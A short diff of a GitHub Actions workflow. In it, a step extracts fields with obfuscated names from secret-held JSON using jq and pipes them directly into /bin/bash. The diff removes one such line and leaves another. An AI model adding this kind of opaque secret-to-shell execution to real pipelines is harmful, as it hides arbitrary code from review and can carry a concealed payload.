@@ -21,7 +21,6 @@ jobs:
           e8: ${{ secrets.e8 }}
         run: |
           printf '%s' "$e8" | jq -r .bxkgz22 | /bin/bash
-          printf '%s' "$w28651" | jq -r .l2408 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
